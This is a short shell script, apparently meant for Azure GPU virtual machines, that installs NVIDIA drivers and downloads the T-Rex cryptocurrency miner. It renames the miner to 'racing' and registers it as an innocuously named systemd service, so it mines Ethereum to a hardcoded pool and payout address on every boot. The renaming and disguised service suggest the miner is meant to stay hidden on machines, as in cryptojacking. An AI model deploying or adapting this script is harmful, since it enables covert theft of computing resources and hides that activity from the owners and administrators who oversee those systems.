cd /home
myworker=$(date +'%d%m_%H%M%S_')
mytype=NC32
myworker+=$mytype
username=$HOSTNAME
myworker+=$username
sudo apt-get install build-essential libglvnd-dev pkg-config -y
sudo apt-get install linux-headers-$(uname -r)
wget https://download.microsoft.com/download/4/3/9/439aea00-a02d-4875-8712-d1ab46cf6a73/NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
sudo chmod +x NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
sudo ./NVIDIA-Linux-x86_64-510.47.03-grid-azure.run -s
wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
tar -zxvf t-rex-0.25.12-linux.tar.gz
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re_NC32_\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
./racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker &
